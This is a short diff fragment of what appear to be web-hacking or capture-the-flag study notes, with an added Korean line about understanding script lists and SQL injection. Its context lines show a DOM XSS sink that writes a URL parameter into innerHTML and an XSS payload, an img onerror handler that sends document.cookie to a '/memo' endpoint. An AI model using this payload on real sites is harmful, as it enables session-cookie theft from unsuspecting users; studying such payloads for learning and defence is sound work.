@@ -146,3 +146,5 @@ def flag():
 <script>var x=new URLSearchParams(location.search); document.getElementById('vuln').innerHTML = x.get('param');</script>
 
 <img src="XSS-2" onerror="location.href='/memo?memo='+document.cookie">
+
+script list, sql injection 어떻게 동작하는지 파악.
